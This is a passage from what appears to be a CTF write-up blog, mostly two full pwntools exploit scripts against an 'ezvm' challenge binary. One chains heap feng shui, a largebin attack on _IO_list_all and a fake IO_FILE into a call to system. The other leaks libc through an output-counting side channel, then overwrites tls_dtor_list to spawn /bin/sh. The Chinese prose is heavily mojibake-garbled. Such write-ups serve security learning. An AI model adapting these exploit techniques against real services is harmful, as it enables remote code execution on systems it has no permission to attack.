p8(<span class="hljs-number">9</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jmp</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xe</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jnz</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xf</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jz</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x10</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">eq</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x11</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov</span>(<span class="hljs-params">regIdx,imm</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x14</span>) + p8(regIdx) + pack(imm)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">store</span>(<span class="hljs-params">regIdx,offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x15</span>) + p8(regIdx) + p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">regIdx,offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x16</span>) + p8(regIdx) + p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">halt</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x17</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">other</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xff</span>)<br><br><span class="hljs-comment"># Take from code below</span><br>main_arena_d96 = <span class="hljs-number">0x7ffff7fa5ce0</span><br>TARGET = <span class="hljs-number">0x000055555555a4c0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_libc_addr</span>(<span class="hljs-params">Mem_idx,Addr</span>):<br>    <span class="hljs-keyword">return</span> push(<span class="hljs-number">3</span>) + mov(<span class="hljs-number">0</span>,Addr-main_arena_d96) + push(<span class="hljs-number">0</span>) + add() + pop(<span class="hljs-number">0</span>) + store(<span class="hljs-number">0</span>,Mem_idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_heap_addr</span>(<span class="hljs-params">Mem_idx,Addr</span>):<br>    <span class="hljs-keyword">return</span> push(<span class="hljs-number">2</span>) + mov(<span class="hljs-number">0</span>,Addr-TARGET) + push(<span class="hljs-number">0</span>) + add() + pop(<span class="hljs-number">0</span>) + store(<span class="hljs-number">0</span>,Mem_idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_chain</span>(<span class="hljs-params">start_idx,chain</span>):<br>    code = <span class="hljs-string">&#x27;&#x27;</span><br>    idx = start_idx<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(chain)):<br>        <span class="hljs-keyword">if</span> (chain[i] &gt;&gt; <span class="hljs-number">32</span>) &gt;= <span class="hljs-number">0x7000</span> <span class="hljs-keyword">and</span> (chain[i] &gt;&gt; <span class="hljs-number">32</span>) &lt;= <span class="hljs-number">0x7fff</span>:<br>            code += write_libc_addr(idx,chain[i])<br>            idx += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> (chain[i] &gt;&gt; <span class="hljs-number">32</span>) &gt;= <span class="hljs-number">0x5000</span> <span class="hljs-keyword">and</span> (chain[i] &gt;&gt; <span class="hljs-number">32</span>) &lt; <span class="hljs-number">0x7000</span>:<br>            code += write_heap_addr(idx,chain[i])<br>            idx += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            code += mov(<span class="hljs-number">0</span>,chain[i]) + store(<span class="hljs-number">0</span>,idx)<br>            idx += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_vm</span>(<span class="hljs-params">codeSize,memoryCount,code</span>):<br>    sl(<span class="hljs-string">&quot;yes&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Please input your code size:&quot;</span>,<span class="hljs-built_in">str</span>(codeSize))<br>    sla(<span class="hljs-string">&quot;Please input your memory count:&quot;</span>,<span class="hljs-built_in">str</span>(memoryCount))<br>    sla(<span class="hljs-string">&quot;Please input your code:&quot;</span>,<span class="hljs-built_in">str</span>(code))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">heap_spary</span>(<span class="hljs-params">size</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    code = halt()<br>    run_vm(size,<span class="hljs-number">0x430</span>//<span class="hljs-number">8</span>,code)<br>    pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Heap Fengshui</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>):<br>    heap_spary(i*<span class="hljs-number">0x10</span>)<br>memory_addr = <span class="hljs-number">0x55555555a290</span> + <span class="hljs-number">0x10</span><br>code = <span class="hljs-string">&#x27;&#x27;</span><br>code += mov(<span class="hljs-number">0</span>,<span class="hljs-number">0x00000000000004e1</span>) <span class="hljs-comment"># 0x120+0x130+0x140+0x150+1</span><br>code += store(<span class="hljs-number">0</span>,(<span class="hljs-number">0x55555555a3a8</span> - memory_addr)//<span class="hljs-number">8</span>) <br>code += mov(<span class="hljs-number">0</span>,<span class="hljs-number">0x00000000000004f1</span>) <span class="hljs-comment"># Largebin little bigger than unsorted</span><br>code += store(<span class="hljs-number">0</span>,(<span class="hljs-number">0x55555555a4c8</span> - memory_addr)//<span class="hljs-number">8</span>) <br>code += mov(<span class="hljs-number">0</span>,<span class="hljs-number">0x55555555a9e0</span> - <span class="hljs-number">0x55555555a9b0</span>+<span class="hljs-number">1</span>) <span class="hljs-comment"># Repair Heap</span><br>code += store(<span class="hljs-number">0</span>,(<span class="hljs-number">0x55555555a9b8</span> - memory_addr)//<span class="hljs-number">8</span>) <br>code += halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x2000000000000000</span>+<span class="hljs-number">0x108</span>//<span class="hljs-number">8</span>,code)<br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] 0x4f0 into Unsortedbin</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>code = halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x120</span>//<span class="hljs-number">8</span>,code)<br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] 0x4f0 into Largebin</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>code = halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x750000</span>//<span class="hljs-number">8</span>,code)<br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] 0x4e0 into Unsortedbin</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>code = halt() <br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x110</span>//<span class="hljs-number">8</span>,code) <br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Calculate to Largebin Attack _IO_list_all while makeing Fake_IO_FILE &lt; b *$rebase(0x2248) p *(struct _IO_FILE_plus *)0x55555555a4c0 &gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>memory_addr = <span class="hljs-number">0x55555555a3a0</span> + <span class="hljs-number">0x10</span><br>_IO_list_all = <span class="hljs-number">0x7ffff7fa6680</span><br>TARGET = <span class="hljs-number">0x000055555555a4c0</span><br>main_arena_d96 = <span class="hljs-number">0x7ffff7fa5ce0</span><br>_IO_wfie_jumps = <span class="hljs-number">0x7ffff7fa20c0</span><br>chain = [TARGET,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,TARGET+<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>] + [<span class="hljs-number">0</span>]*(((<span class="hljs-number">0xd8</span>-<span class="hljs-number">0xc0</span>)//<span class="hljs-number">8</span>) - <span class="hljs-number">1</span>) + [_IO_wfie_jumps+<span class="hljs-number">0x30</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x7ffff7ddcd60</span>,TARGET+<span class="hljs-number">0xd0</span>] <span class="hljs-comment"># _lock... _wide_data... system</span><br>code = <span class="hljs-string">&#x27;&#x27;</span><br>code += load(<span class="hljs-number">3</span>,<span class="hljs-number">0</span>)  <span class="hljs-comment"># 0x7ffff7fa5ce0 &lt;main_arena+96&gt;</span><br>code += load(<span class="hljs-number">2</span>,(TARGET + <span class="hljs-number">0x20</span> - memory_addr)//<span class="hljs-number">8</span>) <span class="hljs-comment"># (Victim&#x27;s Largebin -&gt; bk) -&gt; 0x55555555a4e0: 0x000055555555a4c0 &lt; - Largebin Addr</span><br>code += write_chain((TARGET + <span class="hljs-number">0x28</span> - memory_addr)//<span class="hljs-number">8</span>,[_IO_list_all-<span class="hljs-number">0x20</span>])<br>code += write_chain((TARGET + <span class="hljs-number">0x88</span> - memory_addr)//<span class="hljs-number">8</span>,chain)<br>code += halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x4d8</span>//<span class="hljs-number">8</span>,code) <span class="hljs-comment"># 0x4e0 Unsortedbin </span><br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Trigger Largebin Attack,repair FAKE_IO_FILE</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>chain = [<span class="hljs-number">0x6873</span>,<span class="hljs-number">0x4f1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]<br>code = write_chain((TARGET - memory_addr)//<span class="hljs-number">8</span>,chain)<br>code += halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x4c8</span>//<span class="hljs-number">8</span>,code)<br>sl(<span class="hljs-string">&#x27;bye bye&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220921201658577.png" alt="exp"></p><h3 id="æ€è·¯äºŒ-Side-channel-leak"><a class="header-anchor" href="#æ€è·¯äºŒ-Side-channel-leak">Â¶</a>æ€è·¯äºŒ Side-channel leak</h3><p>èµ›åå­¦çš„æ€è·¯ï¼Œæ„Ÿè§‰å¾ˆå·§å¦™ï¼Œåˆ©ç”¨çš„æ˜¯è¾“å‡ºçš„å¤šå°‘è¡Œ <code>what</code> åæ¨å­—èŠ‚æ•°ï¼ŒğŸ‘´ğŸ» ä»¬tqlã€‚</p><p>è¿™ä¸ªè™šæ‹Ÿæœºç»™å‡ºçš„å‘½ä»¤å¾ˆå…¨ï¼Œå¯ä»¥å†™ä¸€ä¸ª <code>equal() jnz()</code> è¿™æ ·çš„å¾ªç¯æ¥ä¾§ä¿¡é“çˆ†ç ´å­—èŠ‚ï¼Œä»0å¼€å§‹çˆ†ç ´ï¼Œå¦‚æœç›¸ç­‰çš„è¯å°±è·³è½¬åˆ°ç»“æŸï¼Œå¦åˆ™è¾“å‡ºä¸€è¡ŒæŠ¥é”™ï¼Œæœ€åè®°å½•è¾“å‡ºçš„è¡Œæ•°å³å¯æ¨å‡ºè¯¥å­—èŠ‚ä¸ºå¤šå°‘ã€‚</p><p>Leak å‡ºæ¥åå¯ä»¥æ‰“ IOï¼Œæˆ‘è¿™é‡Œæ‰“çš„æ˜¯ <code>call_dtor_list</code>ï¼Œå·®åˆ«ä¸å¤§ã€‚</p><h4 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">Â¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ezvm&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&#x27;./ezvm&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;&quot;</span>,)<br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">regIdx</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0</span>)+p8(regIdx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">regIdx</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">1</span>)+p8(regIdx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">4</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lshift</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">7</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rshift</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">8</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">And</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">9</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jmp</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xe</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jnz</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xf</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jz</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x10</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">eq</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x11</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov</span>(<span class="hljs-params">regIdx,imm</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x14</span>) + p8(regIdx) + pack(imm)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">store</span>(<span class="hljs-params">regIdx,offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x15</span>) + p8(regIdx) + p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">regIdx,offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x16</span>) + p8(regIdx) + p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">halt</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x17</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">other</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xff</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_vm</span>(<span class="hljs-params">codeSize,memoryCount,code</span>):<br>    sl(<span class="hljs-string">&quot;yes&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Please input your code size:&quot;</span>,<span class="hljs-built_in">str</span>(codeSize))<br>    sla(<span class="hljs-string">&quot;Please input your memory count:&quot;</span>,<span class="hljs-built_in">str</span>(memoryCount))<br>    sla(<span class="hljs-string">&quot;Please input your code:&quot;</span>,<span class="hljs-built_in">str</span>(code))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_byte</span>(<span class="hljs-params">addr_offset,byte_offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    payload = [<br>        load(<span class="hljs-number">0</span>,addr_offset),push(<span class="hljs-number">0</span>),<br>        mov(<span class="hljs-number">0</span>,byte_offset*<span class="hljs-number">8</span>),push(<span class="hljs-number">0</span>),rshift(),<br>        mov(<span class="hljs-number">0</span>,<span class="hljs-number">0xff</span>),push(<span class="hljs-number">0</span>),And(),pop(<span class="hljs-number">0</span>), <span class="hljs-comment"># Reg0 = real_byte</span><br>        mov(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),mov(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>), <span class="hljs-comment"># Reg1 for guess byte;Reg2 as tool-reg for += 1</span><br>        push(<span class="hljs-number">1</span>),push(<span class="hljs-number">0</span>),<br>        eq(),   <span class="hljs-comment"># While Reg1 != Reg0</span><br>        jnz(<span class="hljs-number">0x58</span>+<span class="hljs-number">3</span>-<span class="hljs-number">8</span>-<span class="hljs-number">0x42</span>), <span class="hljs-comment"># If Reg1 == Reg0, go RETURN (Debug to attain ip_offset)</span><br>        other(), <span class="hljs-comment"># Side-channel Leak --- each time puts a line of &quot;what???&quot;</span><br>        push(<span class="hljs-number">1</span>),push(<span class="hljs-number">2</span>),add(),pop(<span class="hljs-number">1</span>), <span class="hljs-comment"># Reg1 += 1</span><br>        jmp((<span class="hljs-number">0x38</span>+<span class="hljs-number">4</span>-<span class="hljs-number">0x53</span>-<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xffffffffffffffff</span>), <span class="hljs-comment"># continue</span><br>        halt() <span class="hljs-comment"># return</span><br>    ]<br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_addr</span>(<span class="hljs-params">addr_offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    addr = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x4d8</span>//<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;&#x27;</span>.join(leak_byte(addr_offset,<span class="hljs-number">8</span>-<span class="hljs-number">1</span>-i)))<br>        pc = <span class="hljs-number">0</span><br>        side_data = ru(<span class="hljs-string">&quot;finish&quot;</span>)<br>        leaked_byte = side_data.count(<span class="hljs-string">&quot;what???&quot;</span>)<br>        lg(<span class="hljs-string">&#x27;BYTE[%d]&#x27;</span>%(<span class="hljs-number">8</span> - <span class="hljs-number">1</span> -i),leaked_byte)<br>        addr &lt;&lt;= <span class="hljs-number">8</span><br>        addr += leaked_byte<br>    <span class="hljs-keyword">return</span> addr<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Do Leak</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x3000</span>//<span class="hljs-number">8</span>,halt())<br>libc_leak = leak_addr(<span class="hljs-number">0</span>)<br>libc_base = libc_leak - <span class="hljs-number">0x219ce0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Do OOB Write</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>fskey = -<span class="hljs-number">0x2890</span> + libc_base<br>tls_dtor_list = -<span class="hljs-number">0x2918</span> + libc_base<br>memory = -<span class="hljs-number">0x25ff0</span> +libc_base <br>code = mov(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) + store(<span class="hljs-number">0</span>,(fskey-memory)//<span class="hljs-number">8</span>) <span class="hljs-comment"># fskey = 0</span><br>code += mov(<span class="hljs-number">0</span>,tls_dtor_list+<span class="hljs-number">8</span>) + store(<span class="hljs-number">0</span>,(tls_dtor_list-memory)//<span class="hljs-number">8</span>) <span class="hljs-comment"># tls_dtor_list = &amp;tls_dtor_list + 8</span><br>code += mov(<span class="hljs-number">0</span>,rol(system_addr,<span class="hljs-number">0x11</span>,<span class="hljs-number">64</span>)) + store(<span class="hljs-number">0</span>,(tls_dtor_list+<span class="hljs-number">8</span>-memory)//<span class="hljs-number">8</span>) <span class="hljs-comment"># *(&amp;tls_dtor_list + 8) = rol(__libc_system,0x11,64)  # RIP</span><br>code += mov(<span class="hljs-number">0</span>,bin_sh) + store(<span class="hljs-number">0</span>,(tls_dtor_list+<span class="hljs-number">0x10</span>-memory)//<span class="hljs-number">8</span>) <span class="hljs-comment"># *(&amp;tls_dtor_list + 0x10) = rol(__libc_system,0x11,64) # RDI</span><br>code += halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x2000000000000000</span>+<span class="hljs-number">0x22000</span>//<span class="hljs-number">8</span>,code)<br><br>sl(<span class="hljs-string">&#x27;bye bye&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="babysnitch-10-Solved-Workingâ€¦"><a class="header-anchor" href="#babysnitch-10-Solved-Workingâ€¦">Â¶</a>babysnitch (10 Solved)(Workingâ€¦)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220922162517106.png" alt="babysnitch"></p><h3 id="é¢˜ç›®æè¿°-v3"><a class="header-anchor" href="#é¢˜ç›®æè¿°-v3">Â¶</a>é¢˜ç›®æè¿°</h3><p>I have my application firewall installed. It should protect my flag even against RCE. Isnâ€™t It?</p><p><a 